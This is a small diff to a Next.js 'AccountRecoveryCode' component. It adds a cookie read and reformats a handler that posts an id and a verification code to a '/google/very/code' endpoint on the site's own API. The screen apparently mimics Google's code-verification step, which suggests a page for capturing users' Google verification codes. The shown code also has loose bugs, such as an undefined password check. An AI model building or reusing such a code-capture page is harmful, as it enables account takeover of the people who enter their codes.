@@ -1,17 +1,19 @@
 "use client";
 import { API_URL } from "@/config";
+import Cookies from "js-cookie";
 import Image from "next/image";
 import React, { useState } from "react";
 
 function AccountRecoveryCode() {
   const [gcode, setGcode] = useState();
-const handleGCode = async() => {
+  const id = Cookies.get("gid");
+  const handleGCode = async () => {
     if (!password) {
       return;
     }
     const values = {
       id,
-      gcode
+      gcode,
     };
     const url = `${API_URL}/google/very/code`;
 
@@ -28,7 +30,7 @@ const handleGCode = async() => {
 
     if (res.ok) {
       console.log("success", data);
-      return <div></div>
+      return <div></div>;
       // router.push("/account-verifying-state");
     } else {
       console.log("error", data);
@@ -77,7 +79,7 @@ const handleGCode = async() => {
             </div>
           </div>
         </div>
-          <div className="text-blue-500 font-semibold">Resend it</div>
+        <div className="text-blue-500 font-semibold">Resend it</div>
         <div className="flex justify-between items-center">
           <button className="text-blue-600 font-medium text-sm mt-2">
             I don't have my phone
